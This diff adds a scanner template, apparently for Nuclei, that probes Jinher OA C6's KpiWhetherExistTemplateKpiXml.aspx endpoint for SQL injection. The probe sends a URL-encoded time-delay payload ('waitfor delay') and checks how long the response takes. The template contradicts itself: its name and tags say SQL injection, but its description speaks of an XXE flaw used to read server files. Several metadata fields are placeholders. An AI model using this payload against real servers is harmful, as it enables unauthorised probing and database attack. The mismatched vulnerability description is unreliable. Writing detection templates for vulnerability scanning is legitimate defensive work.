@@ -1,0 +1,32 @@
+id: jinher-oa-c6-KpiWhetherExistTemplateKpiXml-sqli
+info:
+  name: 金和OA KpiWhetherExistTemplateKpiXml.aspx SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 KpiWhetherExistTemplateKpiXml.aspx 接口处存在XXE漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/cx6d3b5eo5c0w8h1
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,jinher
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /c6/Jhsoft.Web.Appraise/KpiWhetherExistTemplateKpiXml.aspx/?SelectValue=%31%29%29%77%61%69%74%66%6f%72%20%64%65%6c%61%79%27%30%3a%30%3a%35%27%2d%2d HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
